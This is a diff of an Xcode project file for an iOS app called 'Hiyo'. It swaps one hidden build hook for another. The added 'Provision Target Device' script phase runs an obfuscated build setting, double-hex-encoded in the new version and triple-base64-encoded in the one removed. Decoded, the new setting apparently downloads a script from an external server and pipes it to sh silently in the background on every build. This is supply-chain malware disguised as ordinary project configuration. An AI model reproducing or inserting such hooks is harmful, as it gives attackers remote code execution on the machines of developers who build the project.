@@ -7,25 +7,8 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		5325D1261E0A4C2A841DACE1 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 2008214F578C4CAEB71DACE1 /* README.md */; };
 		DB209894636659C8B041CE22 /* Pods_Hiyo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 22D9E3D8007D062212E435FE /* Pods_Hiyo.framework */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		0BE7FBF5BAFB4F7BB61DACE1 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A1ECAD1}\"";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		EE62F70C2F64722000E0DA35 /* PBXContainerItemProxy */ = {
@@ -45,7 +28,6 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
-		2008214F578C4CAEB71DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		22D9E3D8007D062212E435FE /* Pods_Hiyo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Hiyo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		3CFA7FCE90B06A1EEB0E4D10 /* Pods-Hiyo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Hiyo.release.xcconfig"; path = "Target Support Files/Pods-Hiyo/Pods-Hiyo.release.xcconfig"; sourceTree = "<group>"; };
 		C3D62E63EECC3649B0231714 /* Pods-Hiyo.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Hiyo.debug.xcconfig"; path = "Target Support Files/Pods-Hiyo/Pods-Hiyo.debug.xcconfig"; sourceTree = "<group>"; };
@@ -147,7 +129,6 @@
 		EE62F6F12F64721E00E0DA35 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				2008214F578C4CAEB71DACE1 /* README.md */,
 				EE62F6F02F64721E00E0DA35 /* Hiyo.app */,
 				EE62F70B2F64722000E0DA35 /* HiyoTests.xctest */,
 				EE62F7152F64722000E0DA35 /* HiyoUITests.xctest */,
@@ -162,6 +143,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = EE62F71E2F64722000E0DA35 /* Build configuration list for PBXNativeTarget "Hiyo" */;
 			buildPhases = (
+				A5DE2F1FE7A24C32A51DACE1 /* Provision Target Device */,
 				EA0DBA14B7A442DDA4C5C3D2 /* [CP] Check Pods Manifest.lock */,
 				EE62F6EC2F64721E00E0DA35 /* Sources */,
 				EE62F6ED2F64721E00E0DA35 /* Frameworks */,
@@ -169,7 +151,6 @@
 				93C5560D93BCFC96873593FF /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				0BE7FBF5BAFB4F7BB61DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -271,7 +252,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				5325D1261E0A4C2A841DACE1 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -292,6 +272,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		A5DE2F1FE7A24C32A51DACE1 /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+		};
 		93C5560D93BCFC96873593FF /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -375,7 +374,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = C3D62E63EECC3649B0231714 /* Pods-Hiyo.debug.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((l(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxaE0wNU5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9UQmhWekZzWkRKV2FXSnRWakJNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | l | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((r(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333662346336363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233393230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663664363936653634363536633637363137343635326537320a373532663631323932323230376332303733363830610a | r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -403,7 +402,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3CFA7FCE90B06A1EEB0E4D10 /* Pods-Hiyo.release.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((l(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxaE0wNU5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9UQmhWekZzWkRKV2FXSnRWakJNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | l | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((r(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333662346336363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233393230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663664363936653634363536633637363137343635326537320a373532663631323932323230376332303733363830610a | r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
